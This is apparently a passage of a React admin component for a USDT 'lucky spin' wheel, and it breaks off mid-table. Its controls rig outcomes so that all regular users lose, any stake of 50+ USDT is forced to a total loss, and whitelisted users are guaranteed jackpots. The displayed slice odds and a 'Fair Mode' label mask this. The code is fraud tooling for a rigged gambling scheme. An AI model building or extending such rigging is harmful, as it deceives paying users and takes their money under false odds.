import React, { useState, useEffect } from 'react';
import {
  Settings,
  Save,
  RotateCcw,
  Sparkles,
  Gift,
  AlertCircle,
  CheckCircle2,
  Plus,
  ShieldAlert,
  Crown,
  UserCheck,
  Trash2,
  Play,
  Flame,
  Zap,
  TrendingDown,
  DollarSign
} from 'lucide-react';
import { luckySpinService, DEFAULT_SPIN_SLICES } from '../../services/luckySpinService';
import { authService, type UserProfile } from '../../services/authService';
import type { SpinSlice, SpinAdminConfig, WhitelistedSpinUser } from '../../types/spin';

export const AdminSpinWheelManager: React.FC = () => {
  const [slices, setSlices] = useState<SpinSlice[]>([]);
  const [config, setConfig] = useState<SpinAdminConfig | null>(null);
  const [allUsers, setAllUsers] = useState<UserProfile[]>([]);
  const [successMsg, setSuccessMsg] = useState<string | null>(null);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);

  // Whitelist Form State
  const [selectedUserKey, setSelectedUserKey] = useState<string>('');
  const [customUserId, setCustomUserId] = useState<string>('');
  const [outcomeMode, setOutcomeMode] = useState<WhitelistedSpinUser['outcomeMode']>('JACKPOT');
  const [fixedSliceIndex, setFixedSliceIndex] = useState<number>(7);
  const [overrideHighStake, setOverrideHighStake] = useState<boolean>(false);
  const [notes, setNotes] = useState<string>('');
  const [testOutcomeResult, setTestOutcomeResult] = useState<string | null>(null);
  const [testStakeAmount, setTestStakeAmount] = useState<number>(50);

  // Manual Grant State
  const [targetUserId, setTargetUserId] = useState<string>('');
  const [grantSpinsCount, setGrantSpinsCount] = useState<number>(3);
  const [grantSuccess, setGrantSuccess] = useState<string | null>(null);

  useEffect(() => {
    refreshAll();
  }, []);

  const refreshAll = () => {
    setSlices(luckySpinService.getSlices());
    setConfig(luckySpinService.getAdminConfig());
    setAllUsers(authService.getAllUsers());
  };

  const handleSliceChange = (index: number, field: keyof SpinSlice, value: unknown) => {
    const updated = [...slices];
    updated[index] = { ...updated[index], [field]: value };
    // Recompute probabilities dynamically
    const withProbabilities = luckySpinService.computeSliceProbabilities(updated);
    setSlices(withProbabilities);
  };

  const handleSaveSlices = () => {
    try {
      luckySpinService.saveSlices(slices);
      setSuccessMsg('Wheel slices and probabilities updated successfully!');
      setTimeout(() => setSuccessMsg(null), 3000);
    } catch {
      setErrorMsg('Failed to save slice configuration.');
    }
  };

  const handleResetDefaults = () => {
    const defaultComputed = luckySpinService.computeSliceProbabilities(DEFAULT_SPIN_SLICES);
    setSlices(defaultComputed);
    luckySpinService.saveSlices(defaultComputed);
    setSuccessMsg('Reset to default balanced slices.');
    setTimeout(() => setSuccessMsg(null), 3000);
  };

  const handleSaveConfig = () => {
    if (!config) return;
    try {
      luckySpinService.saveAdminConfig(config);
      setSuccessMsg('Spin administration settings saved!');
      setTimeout(() => setSuccessMsg(null), 3000);
    } catch {
      setErrorMsg('Failed to save config.');
    }
  };

  const handleToggleGlobalForceLoss = () => {
    if (!config) return;
    const updatedVal = !config.forceLossForRegularUsers;
    const newConfig = { ...config, forceLossForRegularUsers: updatedVal };
    setConfig(newConfig);
    luckySpinService.saveAdminConfig(newConfig);
    setSuccessMsg(
      updatedVal
        ? '🔴 House Profit Mode ACTIVATED: All normal users are guaranteed to lose!'
        : '🟢 Fair Mode ACTIVATED: Standard probability odds restored.'
    );
    setTimeout(() => setSuccessMsg(null), 4000);
  };

  const handleToggleHighStakeLoss = () => {
    if (!config) return;
    const updatedVal = !config.autoLossOnHighStake;
    const newConfig = { ...config, autoLossOnHighStake: updatedVal };
    setConfig(newConfig);
    luckySpinService.saveAdminConfig(newConfig);
    setSuccessMsg(
      updatedVal
        ? `⚡ High-Stake Auto Loss ACTIVATED: Any spin with ${config.highStakeLossThreshold || 50}+ USDT stake will 100% lose!`
        : '⚡ High-Stake Auto Loss DEACTIVATED.'
    );
    setTimeout(() => setSuccessMsg(null), 4000);
  };

  const handleAddWhitelistedUser = (e: React.FormEvent) => {
    e.preventDefault();
    const effectiveUserId = selectedUserKey || customUserId.trim();
    if (!effectiveUserId) {
      setErrorMsg('Please select a user or enter a valid User ID / Email.');
      return;
    }

    const matchedProfile = allUsers.find(
      (u) =>
        u.id.toLowerCase() === effectiveUserId.toLowerCase() ||
        u.email?.toLowerCase() === effectiveUserId.toLowerCase() ||
        u.username?.toLowerCase() === effectiveUserId.toLowerCase()
    );

    const userEntry: Omit<WhitelistedSpinUser, 'id' | 'createdAt'> = {
      userId: matchedProfile?.id || effectiveUserId,
      username: matchedProfile?.username || matchedProfile?.name,
      email: matchedProfile?.email,
      outcomeMode,
      fixedSliceIndex: outcomeMode === 'CUSTOM_SLICE' ? fixedSliceIndex : undefined,
      customWinRatePercent: outcomeMode === 'HIGH_WIN_RATE' ? 90 : 100,
      overrideHighStakeLoss: overrideHighStake,
      isActive: true,
      notes: notes.trim() || undefined
    };

    try {
      luckySpinService.addWhitelistedProfitUser(userEntry);
      setConfig(luckySpinService.getAdminConfig());
      setSuccessMsg(
        `⭐ User ${matchedProfile?.username || matchedProfile?.email || effectiveUserId} added to Profit Whitelist!`
      );
      setSelectedUserKey('');
      setCustomUserId('');
      setNotes('');
      setOverrideHighStake(false);
      setTimeout(() => setSuccessMsg(null), 4000);
    } catch {
      setErrorMsg('Failed to add user to whitelist.');
    }
  };

  const handleToggleWhitelistActive = (id: string, currentActive: boolean) => {
    luckySpinService.updateWhitelistedProfitUser(id, { isActive: !currentActive });
    setConfig(luckySpinService.getAdminConfig());
  };

  const handleDeleteWhitelistedUser = (id: string) => {
    luckySpinService.removeWhitelistedProfitUser(id);
    setConfig(luckySpinService.getAdminConfig());
    setSuccessMsg('User removed from profit whitelist.');
    setTimeout(() => setSuccessMsg(null), 3000);
  };

  const handleTestUserOutcome = (userId: string) => {
    const chosenSlice = luckySpinService.selectWinningSlice(slices, userId, testStakeAmount);
    const isLoss = chosenSlice.prizeType === 'LOSS' || chosenSlice.prizeType === 'TRY_AGAIN';
    setTestOutcomeResult(
      `🎲 Spin Simulation for "${userId}" with $${testStakeAmount} USDT Stake: Lands on [Slice #${
        chosenSlice.sliceIndex + 1
      }: ${chosenSlice.label}] -> ${
        isLoss
          ? `❌ USER LOSES $${testStakeAmount} USDT (House Keeps 100% Stake)`
          : `🎉 USER WINS $${(chosenSlice.prizeValue * testStakeAmount).toFixed(2)} USDT (${chosenSlice.label})`
      }`
    );
    setTimeout(() => setTestOutcomeResult(null), 8000);
  };

  const handleManualGrant = (e: React.FormEvent) => {
    e.preventDefault();
    if (!targetUserId.trim()) {
      setErrorMsg('Please enter a valid User ID.');
      return;
    }

    try {
      luckySpinService.grantBonusSpins(targetUserId.trim(), grantSpinsCount, 'ADMIN_GRANT');
      setGrantSuccess(`Successfully granted ${grantSpinsCount} spins to user ${targetUserId.trim()}!`);
      setTargetUserId('');
      setTimeout(() => setGrantSuccess(null), 4000);
    } catch {
      setErrorMsg('Failed to grant spins.');
    }
  };

  const totalWeight = slices.reduce((sum, s) => sum + Math.max(0, s.weight), 0);
  const whitelistedList = config?.whitelistedProfitUsers || [];

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: '24px', color: '#F8FAFC' }}>
      {/* Notifications */}
      {successMsg && (
        <div
          style={{
            padding: '12px 16px',
            backgroundColor: 'rgba(34, 197, 94, 0.15)',
            border: '1px solid rgba(34, 197, 94, 0.4)',
            borderRadius: '12px',
            color: '#4ADE80',
            fontSize: '13px',
            display: 'flex',
            alignItems: 'center',
            gap: '8px'
          }}
        >
          <CheckCircle2 size={16} /> {successMsg}
        </div>
      )}

      {errorMsg && (
        <div
          style={{
            padding: '12px 16px',
            backgroundColor: 'rgba(239, 68, 68, 0.15)',
            border: '1px solid rgba(239, 68, 68, 0.4)',
            borderRadius: '12px',
            color: '#F87171',
            fontSize: '13px',
            display: 'flex',
            alignItems: 'center',
            gap: '8px'
          }}
        >
          <AlertCircle size={16} /> {errorMsg}
        </div>
      )}

      {testOutcomeResult && (
        <div
          style={{
            padding: '14px 18px',
            backgroundColor: testOutcomeResult.includes('USER LOSES')
              ? 'rgba(239, 68, 68, 0.15)'
              : 'rgba(56, 189, 248, 0.15)',
            border: `1px solid ${
              testOutcomeResult.includes('USER LOSES') ? 'rgba(239, 68, 68, 0.5)' : 'rgba(56, 189, 248, 0.5)'
            }`,
            borderRadius: '12px',
            color: testOutcomeResult.includes('USER LOSES') ? '#F87171' : '#38BDF8',
            fontSize: '13px',
            fontWeight: 600,
            display: 'flex',
            alignItems: 'center',
            gap: '8px'
          }}
        >
          <Sparkles size={18} /> {testOutcomeResult}
        </div>
      )}

      {/* Header */}
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '12px' }}>
        <div>
          <h2 style={{ margin: 0, fontSize: '20px', fontWeight: 800, color: '#F8FAFC', display: 'flex', alignItems: 'center', gap: '8px' }}>
            <Sparkles color="#F59E0B" size={22} /> Lucky Spin Wheel Master Control
          </h2>
          <p style={{ margin: '4px 0 0 0', fontSize: '13px', color: '#94A3B8' }}>
            Control Win/Loss rigging, 50+ USDT high-stake auto-loss, whitelist profit winners, and edit wheel prizes.
          </p>
        </div>

        <div style={{ display: 'flex', gap: '8px' }}>
          <button
            onClick={handleResetDefaults}
            style={{
              padding: '8px 14px',
              backgroundColor: '#1E293B',
              border: '1px solid #475569',
              borderRadius: '8px',
              color: '#CBD5E1',
              fontSize: '12px',
              fontWeight: 600,
              cursor: 'pointer',
              display: 'flex',
              alignItems: 'center',
              gap: '6px'
            }}
          >
            <RotateCcw size={14} /> Reset Defaults
          </button>
          <button
            onClick={handleSaveSlices}
            style={{
              padding: '8px 16px',
              background: 'linear-gradient(135deg, #F59E0B 0%, #D97706 100%)',
              border: 'none',
              borderRadius: '8px',
              color: '#0F172A',
              fontSize: '12px',
              fontWeight: 800,
              cursor: 'pointer',
              display: 'flex',
              alignItems: 'center',
              gap: '6px',
              boxShadow: '0 4px 12px rgba(245, 158, 11, 0.3)'
            }}
          >
            <Save size={14} /> Save Slices & Odds
          </button>
        </div>
      </div>

      {/* ========================================================================= */}
      {/* 🎯 SECTION 1: HOUSE PROFIT & TARGETED WINNER CONTROL CENTER */}
      {/* ========================================================================= */}
      <div
        style={{
          background: 'linear-gradient(135deg, #1E1B4B 0%, #0F172A 100%)',
          border: '1px solid rgba(239, 68, 68, 0.4)',
          borderRadius: '16px',
          padding: '20px',
          boxShadow: '0 8px 30px rgba(0, 0, 0, 0.4)',
          display: 'flex',
          flexDirection: 'column',
          gap: '20px'
        }}
      >
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', flexWrap: 'wrap', gap: '12px' }}>
          <div>
            <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
              <ShieldAlert color="#EF4444" size={24} />
              <h3 style={{ margin: 0, fontSize: '18px', fontWeight: 800, color: '#F8FAFC' }}>
                House Profit Mode & Win/Loss Rigging System
              </h3>
            </div>
            <p style={{ margin: '4px 0 0 0', fontSize: '12.5px', color: '#CBD5E1' }}>
              Control who wins and who loses. Normal users lose 100% by default, and high stakes (50+ USDT) automatically force a full loss.
            </p>
          </div>

          {/* Master Global Force Loss Toggle */}
          <div
            style={{
              display: 'flex',
              alignItems: 'center',
              gap: '12px',
              padding: '10px 16px',
              backgroundColor: config?.forceLossForRegularUsers ? 'rgba(239, 68, 68, 0.2)' : 'rgba(34, 197, 94, 0.15)',
              border: `1px solid ${config?.forceLossForRegularUsers ? '#EF4444' : '#22C55E'}`,
              borderRadius: '12px'
            }}
          >
            <div style={{ textAlign: 'right' }}>
              <div style={{ fontSize: '12px', fontWeight: 800, color: config?.forceLossForRegularUsers ? '#F87171' : '#4ADE80' }}>
                {config?.forceLossForRegularUsers ? '🔴 HOUSE PROFIT (ALL NORMAL USERS LOSE)' : '🟢 FAIR RNG (NORMAL ODDS)'}
              </div>
              <div style={{ fontSize: '10.5px', color: '#94A3B8' }}>
                {config?.forceLossForRegularUsers ? 'Only whitelisted users can win' : 'Standard math probability active'}
              </div>
            </div>
            <button
              type="button"
              onClick={handleToggleGlobalForceLoss}
              style={{
                padding: '8px 16px',
                backgroundColor: config?.forceLossForRegularUsers ? '#EF4444' : '#22C55E',
                color: '#FFFFFF',
                border: 'none',
                borderRadius: '8px',
                fontSize: '12px',
                fontWeight: 800,
                cursor: 'pointer',
                boxShadow: config?.forceLossForRegularUsers ? '0 0 15px rgba(239, 68, 68, 0.5)' : '0 0 15px rgba(34, 197, 94, 0.5)'
              }}
            >
              {config?.forceLossForRegularUsers ? 'Loss Mode: ON' : 'Loss Mode: OFF'}
            </button>
          </div>
        </div>

        {/* ⚡ HIGH STAKE AUTO-LOSS RULE CARD (50+ USDT = 100% LOSS) */}
        <div
          style={{
            backgroundColor: 'rgba(220, 38, 38, 0.12)',
            border: '1px solid rgba(239, 68, 68, 0.35)',
            borderRadius: '12px',
            padding: '14px 18px',
            display: 'flex',
            justifyContent: 'space-between',
            alignItems: 'center',
            flexWrap: 'wrap',
            gap: '14px'
          }}
        >
          <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
            <div
              style={{
                width: '40px',
                height: '40px',
                borderRadius: '10px',
                backgroundColor: 'rgba(239, 68, 68, 0.25)',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center'
              }}
            >
              <TrendingDown size={22} color="#EF4444" />
            </div>
            <div>
              <div style={{ fontSize: '14px', fontWeight: 800, color: '#F87171', display: 'flex', alignItems: 'center', gap: '8px' }}>
                High-Stake Auto-Loss Protection ({config?.highStakeLossThreshold ?? 50}+ USDT Stake = Guaranteed 100% Loss)
              </div>
              <div style={{ fontSize: '12px', color: '#CBD5E1', marginTop: '2px' }}>
                Whenever any user stakes {config?.highStakeLossThreshold ?? 50} USDT or more hoping for 10x/50x payouts, the system automatically forces a 100% loss.
              </div>
            </div>
          </div>

          <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
            <div>
              <label style={{ fontSize: '10.5px', color: '#94A3B8', display: 'block', marginBottom: '2px' }}>Loss Threshold</label>
              <input
                type="number"
                min="10"
                max="500"
                value={config?.highStakeLossThreshold ?? 50}
                onChange={(e) => {
                  if (!config) return;
                  const val = Math.max(1, parseInt(e.target.value, 10) || 50);
                  const updated = { ...config, highStakeLossThreshold: val };
                  setConfig(updated);
                  luckySpinService.saveAdminConfig(updated);
                }}
                style={{
                  width: '75px',
                  padding: '6px 8px',
                  borderRadius: '6px',
                  backgroundColor: '#1E293B',
                  border: '1px solid #EF4444',
                  color: '#FEF08A',
                  fontWeight: 800,
                  fontSize: '12px'
                }}
              />
            </div>

            <button
              type="button"
              onClick={handleToggleHighStakeLoss}
              style={{
                marginTop: '14px',
                padding: '7px 14px',
                backgroundColor: config?.autoLossOnHighStake !== false ? '#EF4444' : '#475569',
                color: '#FFFFFF',
                border: 'none',
                borderRadius: '8px',
                fontSize: '11.5px',
                fontWeight: 800,
                cursor: 'pointer'
              }}
            >
              {config?.autoLossOnHighStake !== false ? '⚡ Auto-Loss: ON' : 'Auto-Loss: OFF'}
            </button>
          </div>
        </div>

        {/* Status Indicators Bar */}
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '12px' }}>
          <div style={{ backgroundColor: 'rgba(15, 23, 42, 0.6)', padding: '12px 14px', borderRadius: '10px', border: '1px solid #334155' }}>
            <div style={{ fontSize: '11px', color: '#94A3B8', textTransform: 'uppercase', letterSpacing: '0.5px' }}>General Users Mode</div>
            <div style={{ fontSize: '15px', fontWeight: 800, color: config?.forceLossForRegularUsers ? '#F87171' : '#38BDF8', marginTop: '2px' }}>
              {config?.forceLossForRegularUsers ? '❌ 100% Guaranteed Loss' : '⚖️ Mathematical Weights'}
            </div>
          </div>

          <div style={{ backgroundColor: 'rgba(15, 23, 42, 0.6)', padding: '12px 14px', borderRadius: '10px', border: '1px solid #334155' }}>
            <div style={{ fontSize: '11px', color: '#94A3B8', textTransform: 'uppercase', letterSpacing: '0.5px' }}>Stakes &gt;= 50 USDT Rule</div>
            <div style={{ fontSize: '15px', fontWeight: 800, color: '#F87171', marginTop: '2px' }}>
              {config?.autoLossOnHighStake !== false ? '⚡ Auto 100% Loss Active' : 'Off'}
            </div>
          </div>

          <div style={{ backgroundColor: 'rgba(15, 23, 42, 0.6)', padding: '12px 14px', borderRadius: '10px', border: '1px solid #334155' }}>
            <div style={{ fontSize: '11px', color: '#94A3B8', textTransform: 'uppercase', letterSpacing: '0.5px' }}>Whitelisted Profit Users</div>
            <div style={{ fontSize: '15px', fontWeight: 800, color: '#FDE047', marginTop: '2px', display: 'flex', alignItems: 'center', gap: '6px' }}>
              <Crown size={16} color="#FDE047" /> {whitelistedList.filter((u) => u.isActive).length} Active Winner Rules
            </div>
          </div>
        </div>

        {/* Whitelist Winner Form */}
        <div style={{ backgroundColor: '#0F172A', border: '1px solid #334155', borderRadius: '12px', padding: '16px' }}>
          <div style={{ fontSize: '14px', fontWeight: 700, color: '#FEF08A', marginBottom: '12px', display: 'flex', alignItems: 'center', gap: '6px' }}>
            <Crown size={16} /> Add Targeted User To Profit / Win
          </div>

          <form onSubmit={handleAddWhitelistedUser} style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '12px' }}>
              {/* Select Existing User */}
              <div>
                <label style={{ fontSize: '11px', color: '#94A3B8', display: 'block', marginBottom: '4px' }}>
                  Select Registered User
                </label>
                <select
                  value={selectedUserKey}
                  onChange={(e) => {
                    setSelectedUserKey(e.target.value);
                    if (e.target.value) setCustomUserId('');
                  }}
                  style={{
                    width: '100%',
                    padding: '8px 10px',
                    borderRadius: '8px',
                    backgroundColor: '#1E293B',
                    border: '1px solid #475569',
                    color: '#F8FAFC',
                    fontSize: '12px'
                  }}
                >
                  <option value="">-- Choose from Registered Users --</option>
                  {allUsers.map((u) => (
                    <option key={u.id} value={u.id}>
                      {u.name || u.username} ({u.email || u.id.slice(0, 8)})
                    </option>
                  ))}
                </select>
              </div>

              {/* Or Type Manual User ID / Email */}
              <div>
                <label style={{ fontSize: '11px', color: '#94A3B8', display: 'block', marginBottom: '4px' }}>
                  Or Custom User ID / Email / Username
                </label>
                <input
                  type="text"
                  placeholder="e.g. 7f9d8a1c-..."
                  value={customUserId}
                  onChange={(e) => {
                    setCustomUserId(e.target.value);
                    if (e.target.value) setSelectedUserKey('');
                  }}
                  style={{
                    width: '100%',
                    padding: '8px 10px',
                    borderRadius: '8px',
                    backgroundColor: '#1E293B',
                    border: '1px solid #475569',
                    color: '#F8FAFC',
                    fontSize: '12px'
                  }}
                />
              </div>

              {/* Win Outcome Mode */}
              <div>
                <label style={{ fontSize: '11px', color: '#94A3B8', display: 'block', marginBottom: '4px' }}>
                  Guaranteed Profit / Prize Mode
                </label>
                <select
                  value={outcomeMode}
                  onChange={(e) => setOutcomeMode(e.target.value as WhitelistedSpinUser['outcomeMode'])}
                  style={{
                    width: '100%',
                    padding: '8px 10px',
                    borderRadius: '8px',
                    backgroundColor: '#1E293B',
                    border: '1px solid #F59E0B',
                    color: '#FEF08A',
                    fontWeight: 700,
                    fontSize: '12px'
                  }}
                >
                  <option value="JACKPOT">⭐ ⭐ ⭐ Mega Jackpot (50x Win)</option>
                  <option value="ALWAYS_WIN">🎁 Always Win (Random Profit Slice)</option>
                  <option value="CUSTOM_SLICE">🎯 Specific Slice Number</option>
                  <option value="HIGH_WIN_RATE">🔥 High Win Rate (90% Wins)</option>
                </select>
              </div>

              {/* Specific Slice Selector if CUSTOM_SLICE chosen */}
              {outcomeMode === 'CUSTOM_SLICE' && (
                <div>
                  <label style={{ fontSize: '11px', color: '#94A3B8', display: 'block', marginBottom: '4px' }}>
                    Select Specific Target Slice
                  </label>
                  <select
                    value={fixedSliceIndex}
                    onChange={(e) => setFixedSliceIndex(parseInt(e.target.value, 10) || 0)}
                    style={{
                      width: '100%',
                      padding: '8px 10px',
                      borderRadius: '8px',
                      backgroundColor: '#1E293B',
                      border: '1px solid #38BDF8',
                      color: '#38BDF8',
                      fontWeight: 700,
                      fontSize: '12px'
                    }}
                  >
                    {slices.map((s) => (
                      <option key={s.id} value={s.sliceIndex}>
                        Slice #{s.sliceIndex + 1}: {s.label} ({s.prizeValue}x)
                      </option>
                    ))}
                  </select>
                </div>
              )}

              {/* Optional Notes */}
              <div>
                <label style={{ fontSize: '11px', color: '#94A3B8', display: 'block', marginBottom: '4px' }}>
                  Admin Remark / Note (Optional)
                </label>
                <input
                  type="text"
                  placeholder="e.g. Sahil / Main VIP"
                  value={notes}
                  onChange={(e) => setNotes(e.target.value)}
                  style={{
                    width: '100%',
                    padding: '8px 10px',
                    borderRadius: '8px',
                    backgroundColor: '#1E293B',
                    border: '1px solid #475569',
                    color: '#F8FAFC',
                    fontSize: '12px'
                  }}
                />
              </div>
            </div>

            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '10px', marginTop: '6px' }}>
              <label style={{ display: 'flex', alignItems: 'center', gap: '8px', fontSize: '12px', color: '#FEF08A', cursor: 'pointer' }}>
                <input
                  type="checkbox"
                  checked={overrideHighStake}
                  onChange={(e) => setOverrideHighStake(e.target.checked)}
                />
                VIP Exemption: Allow winning even on 50+ USDT stakes (Override High-Stake Auto-Loss)
              </label>

              <button
                type="submit"
                style={{
                  padding: '9px 20px',
                  background: 'linear-gradient(135deg, #10B981 0%, #059669 100%)',
                  border: 'none',
                  borderRadius: '8px',
                  color: '#FFFFFF',
                  fontSize: '12px',
                  fontWeight: 800,
                  cursor: 'pointer',
                  display: 'flex',
                  alignItems: 'center',
                  gap: '6px',
                  boxShadow: '0 4px 12px rgba(16, 185, 129, 0.3)'
                }}
              >
                <Plus size={14} /> Add User To Profit Whitelist
              </button>
            </div>
          </form>
        </div>

        {/* Whitelisted Users Table */}
        <div>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '10px' }}>
            <div style={{ fontSize: '13px', fontWeight: 700, color: '#CBD5E1' }}>
              Active Whitelisted Users ({whitelistedList.length} Configured)
            </div>

            {/* Test Stake Selector */}
            <div style={{ display: 'flex', alignItems: 'center', gap: '6px', fontSize: '12px', color: '#94A3B8' }}>
              <span>Simulation Stake:</span>
              <select
                value={testStakeAmount}
                onChange={(e) => setTestStakeAmount(parseFloat(e.target.value) || 50)}
                style={{
                  padding: '4px 8px',
                  borderRadius: '6px',
                  backgroundColor: '#1E293B',
                  border: '1px solid #475569',
                  color: '#FEF08A',
                  fontWeight: 700,
                  fontSize: '11.5px'
                }}
              >
                <option value="1">1 USDT</option>
                <option value="10">10 USDT</option>
                <option value="50">50 USDT (High Stake)</option>
                <option value="100">100 USDT (Max Stake)</option>
              </select>
            </div>
          </div>

          {whitelistedList.length === 0 ? (
            <div style={{ padding: '16px', backgroundColor: '#0F172A', borderRadius: '8px', textAlign: 'center', color: '#94A3B8', fontSize: '12px' }}>
              No users on the profit whitelist yet. All users currently lose when House Profit Mode is active.
            </div>
          ) : (
            <div style={{ overflowX: 'auto', backgroundColor: '#0F172A', borderRadius: '10px', border: '1px solid #334155' }}>
              <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '12px' }}>
                <thead>
                  <tr style={{ backgroundColor: '#1E293B', color: '#94A3B8', textAlign: 'left' }}>
                    <th style={{ padding: '10px' }}>User Details</th>
                    <th style={{ padding: '10px' }}>Profit / Win Mode</th>
                    <th style={{ padding: '10px' }}>50+ USDT Override</th>
                    <th style={{ padding: '10px' }}>Remark</th>
                    <th style={{ padding: '10px' }}>Status</th>
                    <th style={{ padding: '10px', textAlign: 'right' }}>Actions</th>
                  </tr>
                </thead>
                <tbody>
                  {whitelistedList.map((item) => (
                    <tr key={item.id} style={{ borderBottom: '1px solid #1E293B' }}>
                      <td style={{ padding: '10px' }}>
                        <div style={{ fontWeight: 700, color: '#F8FAFC', display: 'flex', alignItems: 'center', gap: '6px' }}>
                          <UserCheck size={14} color="#4ADE80" /> {item.username || item.email || item.userId}
                        </div>
                        <div style={{ fontSize: '10.5px', color: '#64748B' }}>ID: {item.userId}</div>
                      </td>
                      <td style={{ padding: '10px' }}>
                        <span
                          style={{
                            padding: '4px 8px',
                            borderRadius: '6px',
                            backgroundColor:
                              item.outcomeMode === 'JACKPOT'
                                ? 'rgba(234, 179, 8, 0.2)'
                                : item.outcomeMode === 'ALWAYS_WIN'
                                ? 'rgba(34, 197, 94, 0.2)'
                                : 'rgba(56, 189, 248, 0.2)',
                            color:
                              item.outcomeMode === 'JACKPOT'
                                ? '#FEF08A'
                                : item.outcomeMode === 'ALWAYS_WIN'
                                ? '#4ADE80'
                                : '#38BDF8',
                            fontWeight: 700,
                            fontSize: '11px'
                          }}
                        >
                          {item.outcomeMode === 'JACKPOT'
                            ? '⭐ Mega Jackpot (50x)'
                            : item.outcomeMode === 'ALWAYS_WIN'
                            ? '🎁 Always Win (Any Prize)'
                            : item.outcomeMode === 'CUSTOM_SLICE'
                            ? `🎯 Force Slice #${(item.fixedSliceIndex ?? 0) + 1}`
                            : '🔥 High Win Rate (90%)'}
                        </span>
                      </td>
                      <td style={{ padding: '10px' }}>
                        <span
                          style={{
                            fontSize: '11px',
                            color: item.overrideHighStakeLoss ? '#4ADE80' : '#94A3B8',
                            fontWeight: item.overrideHighStakeLoss ? 700 : 400
                          }}
                        >
                          {item.overrideHighStakeLoss ? '✅ Allowed' : '❌ Auto-Loss'}
                        </span>
                      </td>
                      <td style={{ padding: '10px', color: '#94A3B8' }}>{item.notes || '-'}</td>
                      <td style={{ padding: '10px' }}>
                        <button
                          type="button"
                          onClick={() => handleToggleWhitelistActive(item.id, item.isActive)}
                          style={{
                            padding: '4px 10px',
                            borderRadius: '6px',
                            backgroundColor: item.isActive ? 'rgba(34, 197, 94, 0.2)' : 'rgba(239, 68, 68, 0.2)',
                            border: `1px solid ${item.isActive ? '#22C55E' : '#EF4444'}`,
                            color: item.isActive ? '#4ADE80' : '#F87171',
                            fontSize: '11px',
                            fontWeight: 700,
                            cursor: 'pointer'
                          }}
                        >
                          {item.isActive ? 'ACTIVE' : 'PAUSED'}
                        </button>
                      </td>
                      <td style={{ padding: '10px', textAlign: 'right' }}>
                        <div style={{ display: 'flex', gap: '6px', justifyContent: 'flex-end' }}>
                          <button
                            type="button"
                            onClick={() => handleTestUserOutcome(item.userId)}
                            title="Test outcome simulation for this user"
                            style={{
                              padding: '5px 8px',
                              backgroundColor: '#1E293B',
                              border: '1px solid #475569',
                              borderRadius: '6px',
                              color: '#38BDF8',
                              fontSize: '11px',
                              cursor: 'pointer',
                              display: 'flex',
                              alignItems: 'center',
                              gap: '4px'
                            }}
                          >
                            <Play size={12} /> Test
                          </button>
                          <button
                            type="button"
                            onClick={() => handleDeleteWhitelistedUser(item.id)}
                            title="Remove user from whitelist"
                            style={{
                              padding: '5px 8px',
                              backgroundColor: 'rgba(239, 68, 68, 0.15)',
                              border: '1px solid rgba(239, 68, 68, 0.3)',
                              borderRadius: '6px',
                              color: '#F87171',
                              fontSize: '11px',
                              cursor: 'pointer'
                            }}
                          >
                            <Trash2 size={12} />
                          </button>
                        </div>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      </div>

      {/* ========================================================================= */}
      {/* 🎡 SECTION 2: SLICE PROBABILITY & PRIZE EDITOR TABLE */}
      {/* ========================================================================= */}
      <div
        style={{
          backgroundColor: '#0F172A',
          border: '1px solid #334155',
          borderRadius: '16px',
          padding: '16px',
          overflowX: 'auto'
        }}
      >
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '12px' }}>
          <span style={{ fontSize: '14px', fontWeight: 700, color: '#FEF08A' }}>
            Wheel Slices ({slices.length} Slices | Total Weight: {totalWeight})
          </span>
          <span style={{ fontSize: '12px', color: '#94A3B8' }}>
            Probabilities recalculate automatically from relative weights.
          </span>
        </div>

        <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '12.5px' }}>
          <thead>
            <tr style={{ backgroundColor: '#1E293B', color: '#94A3B8', textAlign: 'left' }}>
              <th style={{ padding: '10px' }}>#</th>
              <th style={{ padding: '10px' }}>Label</th>
              <th style={{ padding: '10px' }}>Prize Type</th>
              <th style={{ padding: '10px' }}>Prize Value</th>
              <th style={{ padding: '10px' }}>Weight</th>
              <th style={{ padding: '10px' }}>Odds (%)</th>
              <th style={{ padding: '10px' }}>Jackpot?</th>
            </tr>
          </thead>
          <tbody>
            {slices.map((slice, idx) => (
              <tr key={slice.id || idx} style={{ borderBottom: '1px solid #1E293B' }}>
                <td style={{ padding: '8px 10px', color: '#64748B', fontWeight: 700 }}>{idx + 1}</td>
                <td style={{ padding: '8px 10px' }}>
                  <input
                    type="text"
                    value={slice.label}
                    onChange={(e) => handleSliceChange(idx, 'label', e.target.value)}
                    style={{
                      width: '120px',
                      padding: '6px 8px',
                      borderRadius: '6px',
                      backgroundColor: '#1E293B',
                      border: '1px solid #475569',
                      color: '#F8FAFC',
                      fontSize: '12px'
                    }}
                  />
                </td>
                <td style={{ padding: '8px 10px' }}>
                  <select
                    value={slice.prizeType}
                    onChange={(e) => handleSliceChange(idx, 'prizeType', e.target.value)}
                    style={{
                      padding: '6px 8px',
                      borderRadius: '6px',
                      backgroundColor: '#1E293B',
                      border: '1px solid #475569',
                      color: '#F8FAFC',
                      fontSize: '12px'
                    }}
                  >
                    <option value="USDT">USDT Multiplier / Cash</option>
                    <option value="APR_BOOST">APR Boost</option>
                    <option value="EXTRA_SPIN">Extra Spin</option>
                    <option value="LOSS">Loss (No Prize)</option>
                    <option value="TRY_AGAIN">Try Again (Loss)</option>
                  </select>
                </td>
                <td style={{ padding: '8px 10px' }}>
